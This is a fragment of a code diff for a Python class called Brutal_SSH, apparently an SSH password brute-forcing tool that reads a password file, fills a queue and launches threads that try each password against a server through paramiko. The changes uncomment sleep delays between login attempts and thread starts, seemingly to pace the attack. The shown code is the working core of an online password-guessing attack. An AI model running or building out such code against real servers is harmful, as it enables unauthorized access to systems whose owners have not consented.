@@ -79,15 +79,14 @@ class Brutal_SSH():
 		else:
 			print ver_out + "{:.<50}".format("Reading password file") + sf
 			self.password_list = self.do_readfile(filename)
-			# for password in self.do_readfile(filename):
-			# 	self.passwords.put(password)
+
 	def do_fill_pass_queue(self):
 		for password in self.password_list:
 			self.passwords.put(password)
 	
 	def do_ssh(self, username):
 		while not self.passwords.empty():
-			# time.sleep(0.1)
+			time.sleep(0.1)
 			password = self.passwords.get()
 			ssh = paramiko.SSHClient()
 			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -107,7 +106,7 @@ class Brutal_SSH():
 		t_threads = self.threads + 1
 		self.do_fill_pass_queue()
 		for x in range(1, t_threads):
-			# time.sleep(4)
+			time.sleep(4)
 			thread = Thread(target=self.do_ssh, args=(username,))
 			thread.start()
 			threads_list.append(thread)
